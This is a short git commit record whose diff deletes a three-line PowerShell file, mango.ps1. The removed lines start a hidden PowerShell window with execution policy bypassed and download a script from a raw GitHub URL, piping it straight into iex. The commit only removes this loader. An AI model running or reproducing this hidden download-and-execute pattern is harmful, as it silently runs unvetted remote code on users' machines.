584445c2b8910559fefa141e5842cd199a9cdb0e
yaroslavhvt <yarikroganov300@gmail.com>
2025-08-03 23:07:20 +0400

    Delete mango.ps1

--- mango.ps1
+++
@@ -1,3 +0,0 @@
-$scriptUrl = 'https://raw.githubusercontent.com/sevcator/mango-mango-mango/refs/heads/main/mango.ps1'
-Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iwr -Uri '$scriptUrl' -UseBasicParsing | iex`"" -WindowStyle Hidden
-exit
